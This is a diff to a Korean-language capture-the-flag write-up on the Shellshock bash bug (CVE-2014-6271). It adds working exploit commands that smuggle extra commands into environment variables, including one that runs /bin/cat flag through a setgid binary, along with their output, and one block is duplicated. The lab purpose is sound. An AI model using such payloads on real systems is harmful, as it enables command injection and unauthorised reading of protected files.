@@ -22,6 +22,18 @@ shellshock@ubuntu:~$ env x='() { :;}; echo vulnerable' bash -c "echo test"
 env x='() { :;}; echo vulnerable' bash -c "echo test"
 test
 ```
+따라서 다음과 같이 환경변수를 만들어주고 `./bash`를 실행시켜보면
+```
+shellshock@ubuntu:~$ export hello='() { pwd; };pwd;id'
+shellshock@ubuntu:~$ ./bash
+/home/shellshock
+uid=1019(shellshock) gid=1019(shellshock) groups=1019(shellshock)
+shellshock@ubuntu:~$ export hello='() { pwd; };pwd;id'
+shellshock@ubuntu:~$ ./bash
+/home/shellshock
+uid=1019(shellshock) gid=1019(shellshock) groups=1019(shellshock)
+```
+; 뒤에 명령어들이 실행되게 된다.
 
 `shellshock.c`를 살펴보면
 ```
@@ -35,4 +47,12 @@ int main(){
         return 0;
 }
 
+```
+bash 자체의 취약점을 이용해서 업그레이드된 gid로 cat flag를 해준다면 flag를 읽을 수 있을 것이다.
+```
+shellshock@ubuntu:~$ export cat='() { pwd; }; /bin/cat flag'
+shellshock@ubuntu:~$ ./shellshock
+only if I knew CVE-2014-6271 ten years ago..!!
+Segmentation fault
+shellshock@ubuntu:~$
 ```
